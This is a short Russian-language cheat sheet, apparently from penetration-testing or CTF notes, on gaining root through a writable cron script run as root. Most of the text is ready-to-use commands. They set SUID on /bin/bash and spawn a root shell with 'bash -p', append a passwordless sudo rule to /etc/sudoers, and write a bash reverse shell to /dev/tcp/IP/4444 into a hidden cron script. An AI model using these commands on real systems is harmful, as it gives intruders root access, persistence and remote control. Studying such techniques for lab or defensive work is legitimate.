Если есть cron-задача, запущенная от root, мы можем внести изменения в скрипт, который запуститься от root.

# Прочитать системные задачи
cat /etc/crontab

Эксплуатация, если есть возможность редактировать скрипт, который запускается от root:
1. Добавить SUID бит
echo '#!/bin/bash
chmod +s /bin/bash' > script.sh

bash -p

Объяснение: Вешаем SUID на bash (теперь любой запуск bash — с правами root). Запуск bash, но он сбрасывает SUID → обычный пользователь. Запуск bash без сброса SUID(-p privelege) → эффективный root.

2. Изменить свои права в sudoersecho 
'#!/bin/bash
echo "boring ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > .mysecretcronjob.sh

3. Реверс шелл
echo '#!/bin/bash
bash -i >& /dev/tcp/IP/4444 0>&1' > .mysecretcronjob.sh

# Прочитать задачи для конкретного пользователя
/var/spool/cron/crontabs/root